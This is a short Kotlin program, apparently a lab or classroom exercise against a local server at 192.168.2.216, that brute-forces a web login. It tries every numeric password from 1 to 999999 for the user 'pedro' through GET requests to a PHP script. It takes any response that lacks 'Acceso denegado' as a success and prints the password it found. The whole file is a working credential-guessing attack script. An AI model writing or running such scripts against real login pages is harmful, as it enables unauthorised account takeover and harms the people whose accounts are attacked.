import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.URI

fun main() {
    var contrasena : Int

    for (i in 1..999999){
        contrasena = i

        val url = URI("http://192.168.2.216/a/FuerzaBruta/postraw.php?username=pedro&password=$contrasena").toURL()

        val conexion = url.openConnection()

        val input = conexion.getInputStream()

        val buffer = BufferedReader(InputStreamReader(input))

        var linea : String?
        var contra : Boolean = true

        while (buffer.readLine().also { linea = it } != null){
            if (linea?.contains("Acceso denegado", ignoreCase = true) == true){
                println("No es esta contraseña")
                contra = false
            } else {
                println(linea)
            }
        }

        if (contra){
            println("La contraseña correcta es: $contrasena")
            return
        }
    }
}